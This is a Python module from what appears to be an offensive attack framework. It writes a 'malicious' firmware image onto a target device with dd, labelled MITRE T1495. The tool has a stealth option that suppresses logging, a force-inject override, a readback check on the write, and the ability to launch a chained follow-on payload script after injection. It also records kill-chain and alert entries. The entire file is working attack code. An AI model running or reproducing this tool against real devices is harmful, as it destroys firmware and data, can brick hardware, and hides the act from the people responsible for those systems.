# modules/attacks/screen_firmware_overwriter.py

import os
import argparse
import subprocess
from datetime import datetime
import json
from hashlib import sha256
import time

AGENT_ID = "screen_fw_overwriter"
LOG_PATH = "results/firmware_attack_logs.json"
ALERT_FILE = "webgui/alerts.json"
KILLCHAIN_FILE = "reports/killchain.json"
MITRE_TTP = "T1495"

os.makedirs("results", exist_ok=True)
os.makedirs("webgui", exist_ok=True)
os.makedirs("reports", exist_ok=True)

def log(msg):
    ts = datetime.utcnow().isoformat()
    print(f"[{AGENT_ID}] {ts} {msg}")

def push_alert(msg):
    alert = {
        "agent": AGENT_ID,
        "alert": msg,
        "type": "firmware",
        "timestamp": time.time()
    }
    with open(ALERT_FILE, "a") as f:
        f.write(json.dumps(alert) + "\n")

def update_killchain(step):
    entry = {
        "agent": AGENT_ID,
        "event": step,
        "time": time.time()
    }
    with open(KILLCHAIN_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def log_overwrite(entry):
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def verify_device(device_path):
    if not os.path.exists(device_path):
        raise FileNotFoundError("Target path does not exist")
    if "/dev/sda" in device_path or "/dev/root" in device_path:
        raise ValueError("Critical device path blocked")

def backup_device(device_path, backup_path):
    try:
        log(f"Backing up {device_path} to {backup_path}")
        subprocess.run(["dd", f"if={device_path}", f"of={backup_path}", "bs=1M", "conv=fsync"], check=True)
        log("Backup complete")
    except subprocess.CalledProcessError:
        log("Backup failed")

def verify_integrity(device_path, firmware_path):
    try:
        fw_data = open(firmware_path, "rb").read()
        readback = subprocess.check_output(["dd", f"if={device_path}", "bs=1M", "count=1"], stderr=subprocess.DEVNULL)
        return sha256(readback).hexdigest() == sha256(fw_data).hexdigest()
    except Exception:
        return False

def already_injected(device_path, firmware_path):
    try:
        fw_hash = sha256(open(firmware_path, "rb").read()).hexdigest()
        readback = subprocess.check_output(["dd", f"if={device_path}", "bs=1M", "count=1"], stderr=subprocess.DEVNULL)
        return sha256(readback).hexdigest() == fw_hash
    except Exception:
        return False

def overwrite_firmware(device_path, malicious_fw, stealth=False):
    try:
        subprocess.run(["dd", f"if={malicious_fw}", f"of={device_path}", "bs=1M", "conv=fsync"], check=True)
        if not stealth:
            log(f"Firmware written to {device_path}")
        return True
    except subprocess.CalledProcessError as e:
        log(f"Firmware overwrite failed: {e}")
        return False

def execute(device_path, fw_image, stealth=False, backup=False, chain=None, force=False):
    fw_hash = sha256(open(fw_image, "rb").read()).hexdigest()

    verify_device(device_path)

    if not force and already_injected(device_path, fw_image):
        log("Target already contains identical payload. Use --force-inject to override.")
        return

    if backup:
        backup_path = f"{device_path}.bak"
        backup_device(device_path, backup_path)

    success = overwrite_firmware(device_path, fw_image, stealth)
    verified = verify_integrity(device_path, fw_image) if success else False

    log_overwrite({
        "agent": AGENT_ID,
        "timestamp": datetime.utcnow().isoformat(),
        "device_path": device_path,
        "firmware_used": fw_image,
        "sha256": fw_hash,
        "verified": verified,
        "backup_taken": backup,
        "chained_payload": chain,
        "stealth": stealth,
        "success": success,
        "forced": force,
        "ttp": MITRE_TTP
    })

    if success and verified:
        push_alert("Firmware overwrite successful")
        update_killchain("Screen firmware overwritten")
        log(f"Firmware overwrite complete and verified. SHA256: {fw_hash}")
        if chain:
            log(f"Chaining payload: {chain}")
            subprocess.Popen(["python3", chain])
    else:
        log("Overwrite failed or integrity mismatch")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Screen Firmware Overwriter")
    parser.add_argument("--device", required=True, help="Target device (e.g., /dev/sdX)")
    parser.add_argument("--firmware", required=True, help="Firmware binary to inject")
    parser.add_argument("--stealth", action="store_true", help="Suppress logs/output")
    parser.add_argument("--backup", action="store_true", help="Backup original image")
    parser.add_argument("--chain", help="Optional post-injection script")
    parser.add_argument("--force-inject", action="store_true", help="Force overwrite even if identical firmware is already present")
    args = parser.parse_args()

    execute(args.device, args.firmware, args.stealth, args.backup, args.chain, args.force_inject)
